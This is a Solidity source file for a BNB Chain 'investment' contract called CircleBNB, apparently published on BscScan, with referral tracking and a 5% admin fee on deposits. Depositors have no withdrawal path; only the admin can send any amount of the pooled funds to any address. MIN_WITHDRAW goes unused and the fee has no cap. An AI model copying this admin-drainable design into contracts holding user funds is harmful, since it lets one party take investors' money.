/**
 *Submitted for verification at BscScan.com on 2021-12-21
*/

pragma solidity ^0.5.17;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract CircleBNB {
    
    
	using SafeMath for uint256;
	using SafeMath for uint8;

	
	uint256 public MIN_WITHDRAW = 0.1 ether;
	uint256 public INVEST_MIN_AMOUNT = 0.1 ether;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint256 public adminfee=5;
	address payable public admin;
	

	struct User {
		uint256 deposits;
		uint256 checkpoint;
		address referrer;
		uint256 totalWithdrawn;
	}

	mapping (address => User) public users;

	event NewDeposit(address indexed user, address indexed referralBy, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);

	constructor(address payable adminAddr) public {
		require(!isContract(adminAddr));
		admin = adminAddr;
	}


	function invest(address referrer) public payable {


		
		require(!isContract(msg.sender) && msg.sender == tx.origin);
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].deposits > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");

		
		if (user.deposits == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
		}

		uint256 msgValue = msg.value;

		admin.transfer(msgValue.mul(adminfee).div(100));

		user.deposits = user.deposits.add(msgValue);

		totalInvested = totalInvested.add(msgValue);
		totalDeposits = totalDeposits.add(1);
		
		emit NewDeposit(msg.sender, user.referrer, msgValue);

	}

	
	function withdraw(address payable _receiver, uint256 _amount) public {
	    
	   require(msg.sender == admin, 'permission denied!');
	   users[_receiver].totalWithdrawn = users[_receiver].totalWithdrawn.add(_amount);
	   totalWithdrawn = totalWithdrawn.add(_amount);
	   _receiver.transfer(_amount);
		emit Withdrawn(_receiver, _amount);
		
	}

	function update_invest(uint256 _amount) external {

		require(msg.sender == admin, 'permission denied!');
		INVEST_MIN_AMOUNT = _amount;
	}

	function update_min_withdraw(uint256 _amount) external{

		require(msg.sender == admin, 'permission denied!');
		MIN_WITHDRAW = _amount;
	}

	function update_fee(uint256 _amount) external{

		require(msg.sender == admin, 'permission denied!');
		adminfee = _amount;
	}

	
	
	function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw) {
        return (totalUsers, totalInvested, totalWithdrawn);
    }
	

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
		return user.deposits;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
		return user.totalWithdrawn;
	}

	
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	
}